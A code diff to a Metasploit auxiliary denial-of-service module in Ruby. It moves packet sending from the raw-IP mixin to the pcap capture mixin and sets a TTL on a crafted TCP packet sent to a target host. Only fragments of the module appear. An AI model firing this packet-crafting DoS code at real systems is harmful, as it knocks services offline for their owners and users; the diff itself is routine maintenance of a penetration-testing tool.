@@ -10,7 +10,7 @@ require 'racket'
 
 class Metasploit3 < Msf::Auxiliary
 
-	include Msf::Exploit::Remote::Ip
+	include Msf::Exploit::Capture
 	include Msf::Auxiliary::Dos
 	
 	def initialize(info = {})
@@ -39,7 +39,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		print_status("Sending packet to #{rhost}")
 
-		connect_ip	
+		open_pcap
 		n = Racket::Racket.new
 
 		n.l3 = Racket::L3::IPv4.new
@@ -47,6 +47,7 @@ class Metasploit3 < Msf::Auxiliary
 		n.l3.dst_ip = rhost
 		n.l3.protocol = 6
 		n.l3.id = rand(0x10000)
+		n.l3.ttl = 64
 		
 		n.l4 = Racket::L4::TCP.new
 		n.l4.dst_port = rand(65535)+1
@@ -62,9 +63,9 @@ class Metasploit3 < Msf::Auxiliary
 	
 		pkt = n.pack
 		
-		ip_write(pkt)
+		capture_sendto(pkt, rhost)
 
-		disconnect_ip
+		close_pcap
 	end
 end
 
